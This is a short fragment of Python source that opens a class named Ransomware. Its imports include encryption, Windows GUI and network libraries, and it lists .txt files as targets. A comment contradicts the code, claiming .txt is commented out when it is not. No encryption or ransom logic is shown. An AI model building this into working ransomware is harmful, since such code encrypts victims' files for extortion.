from cryptography.fernet import Fernet
import os
import webbrowser
import ctypes
import urllib.request
import requests
import time
import datetime
import subprocess
import win32gui
import PythonCrypto
import PythonCrypto.Cipher
import PythonCrypto.Random
import base64

class Ransomware:
    file_exts = [
        '.txt',
        #we comment out .txt so that we can see the ransomware only encrypts the file we have chosen.
        # -and leaves other files unencrypted
        # .txt
    ]
